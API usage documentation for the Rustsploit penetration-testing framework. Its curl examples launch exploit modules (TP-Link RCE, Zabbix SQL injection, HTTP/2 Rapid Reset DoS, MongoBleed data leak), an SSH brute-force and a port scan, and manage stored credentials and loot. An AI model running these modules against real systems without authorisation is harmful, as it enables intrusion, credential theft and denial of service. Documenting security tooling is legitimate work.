# API Usage Examples

Practical workflows for interacting with the Rustsploit PQ-encrypted API.

> Start the server first: `cargo run -- --api`
>
> **Transport note:** every `/api/*` route is behind `pq_middleware` and requires an established PQ session — X25519 + ML-KEM-768 mutual handshake via `POST /pq/handshake`, bootstrapped with the one-time enrollment token (see [API-Server.md](API-Server.md)). There are **no API keys and no Bearer tokens**; the `Authorization: Bearer` headers below are illustrative placeholders showing where session-authenticated requests go. In practice, send these requests through the established PQ channel (REST routes with the derived session keys, or the same method names as JSON-RPC over `GET /pq/ws` — see `src/ws.rs` for the method list).

---

## Health Check (No Auth)

```bash
curl http://localhost:8080/health
```

**Response:**
```json
{"status": "ok", "timestamp": "2026-06-13T14:00:00Z"}
```

---

## List Available Modules

```bash
curl -H "Authorization: Bearer my-secret-key" \
     http://localhost:8080/api/modules
```

**Response (truncated):**
```json
{
  "modules": [
    "exploits/heartbleed",
    "exploits/mongo/mongobleed",
    "scanners/port_scanner",
    "scanners/dir_brute",
    "creds/generic/ssh_bruteforce"
  ],
  "count": 468,
  "request_id": "abc123",
  "timestamp": "2026-06-13T14:01:00Z",
  "duration_ms": 2
}
```

---

## Get Module Details

```bash
curl -H "Authorization: Bearer my-secret-key" \
     http://localhost:8080/api/module/exploits/sample_exploit
```

---

## Run a Port Scan

```bash
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{"module": "scanners/port_scanner", "target": "192.168.1.1"}' \
     http://localhost:8080/api/run
```

---

## Run an Exploit

All exploit modules support full API mode via the `prompts` field. When running
via the API, every interactive prompt can be pre-filled so modules never block
waiting on stdin.

```bash
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{"module": "exploits/heartbleed", "target": "10.10.10.10"}' \
     http://localhost:8080/api/run
```

### Exploit with Prompts

```bash
# TP-Link Archer RCE — supply credentials and command via API
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{
       "module": "exploits/routers/tplink/tplink_archer_rce_cve_2024_53375",
       "target": "192.168.1.1",
       "prompts": {
         "username": "admin",
         "password": "admin123",
         "command": "id"
       }
     }' \
     http://localhost:8080/api/run
```

```bash
# Zabbix SQL Injection — pre-select payload mode and credentials
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{
       "module": "exploits/webapps/zabbix/zabbix_7_0_0_sql_injection",
       "target": "10.10.10.10",
       "prompts": {
         "username": "Admin",
         "password": "zabbix",
         "mode": "3"
       }
     }' \
     http://localhost:8080/api/run
```

```bash
# HTTP/2 Rapid Reset DoS test
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{
       "module": "exploits/frameworks/http2/cve_2023_44487_http2_rapid_reset",
       "target": "10.10.10.10",
       "prompts": {
         "port": "443",
         "use_ssl": "y",
         "num_streams": "500",
         "delay_ms": "1",
         "run_baseline": "y",
         "confirm_permission": "y"
       }
     }' \
     http://localhost:8080/api/run
```

---

## Run a Credential Module

```bash
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{
       "module": "creds/generic/ssh_bruteforce",
       "target": "10.10.10.10",
       "prompts": {
         "port": "22",
         "username_wordlist": "/opt/wordlists/users.txt",
         "password_wordlist": "/opt/wordlists/passwords.txt",
         "concurrency": "100",
         "stop_on_success": "y",
         "save_results": "y",
         "output_file": "ssh_results.txt"
       }
     }' \
     http://localhost:8080/api/run
```

---

## Run MongoBleed (CVE-2025-14847)

```bash
curl -X POST \
     -H "Authorization: Bearer my-secret-key" \
     -H "Content-Type: application/json" \
     -d '{
       "module": "exploits/mongo/mongobleed",
       "target": "10.10.10.10:27017",
       "prompts": {
         "mode": "2",
         "port": "27017",
         "output_file": "leaked_data.bin"
       }
     }' \
     http://localhost:8080/api/run
```

---

## Global Options

```bash
# Set global options
curl -X POST http://localhost:8080/api/options \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"port": "8080", "concurrency": "50"}'

# List global options
curl http://localhost:8080/api/options \
  -H "Authorization: Bearer YOUR_KEY"
```

---

## Credential Store

```bash
# Add a credential
curl -X POST http://localhost:8080/api/creds \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"host": "192.168.1.1", "port": 22, "service": "ssh", "username": "admin", "secret": "password123", "cred_type": "password"}'

# List all credentials
curl http://localhost:8080/api/creds \
  -H "Authorization: Bearer YOUR_KEY"

# Delete a credential
curl -X DELETE http://localhost:8080/api/creds \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"id": "abc12345"}'
```

---

## Workspace & Host Tracking

```bash
# Add a host
curl -X POST http://localhost:8080/api/hosts \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"ip": "192.168.1.1", "hostname": "router.local", "os_guess": "Linux"}'

# List hosts
curl http://localhost:8080/api/hosts -H "Authorization: Bearer YOUR_KEY"

# Add a service
curl -X POST http://localhost:8080/api/services \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"host": "192.168.1.1", "port": 22, "protocol": "tcp", "service_name": "ssh", "version": "OpenSSH 8.9"}'

# List services
curl http://localhost:8080/api/services -H "Authorization: Bearer YOUR_KEY"

# Switch workspace
curl -X POST http://localhost:8080/api/workspace \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"name": "engagement_2"}'
```

---

## Loot Management

```bash
# Store loot
curl -X POST http://localhost:8080/api/loot \
  -H "Authorization: Bearer YOUR_KEY" \
  -H "Content-Type: application/json" \
  -d '{"host": "192.168.1.1", "loot_type": "config", "description": "Router config dump", "data": "hostname router1\ninterface eth0..."}'

# List loot
curl http://localhost:8080/api/loot -H "Authorization: Bearer YOUR_KEY"
```

---

## Background Jobs

```bash
# List running jobs
curl http://localhost:8080/api/jobs -H "Authorization: Bearer YOUR_KEY"

# Kill a job
curl -X DELETE http://localhost:8080/api/jobs/1 -H "Authorization: Bearer YOUR_KEY"
```

---

## Export Engagement Data

```bash
# Export all data as JSON
curl http://localhost:8080/api/export?format=json -H "Authorization: Bearer YOUR_KEY"
```

---

## Shell Endpoint — Not Implemented

`POST /api/shell` returns `501 NOT_IMPLEMENTED` — there is no shell-over-HTTP
route. Equivalent workflows use the individual REST routes above, the JSON-RPC
methods over `GET /pq/ws` (see `src/ws.rs`), or the MCP server
([MCP-Integration.md](MCP-Integration.md)) for LLM-driven automation.

---

## Full Workflow Cheatsheet

```bash
# 1. Start server (prints the one-time enrollment token)
cargo run -- --api

# 2. Health check (no session needed)
curl http://localhost:8080/health

# 3. Enroll a client + establish a PQ session
#    POST /pq/register-key { token, name, x25519_pub, mlkem_ek }
#    POST /pq/handshake                       (see API-Server.md)

# 4. List modules (through the PQ session)
curl -H "Authorization: Bearer <pq-session>" http://localhost:8080/api/modules

# 5. Port scan
curl -X POST -H "Authorization: Bearer <pq-session>" \
     -H "Content-Type: application/json" \
     -d '{"module": "scanners/port_scanner", "target": "192.168.1.1"}' \
     http://localhost:8080/api/run

# 6. Export engagement data
curl -H "Authorization: Bearer <pq-session>" \
     "http://localhost:8080/api/export?format=json"
```
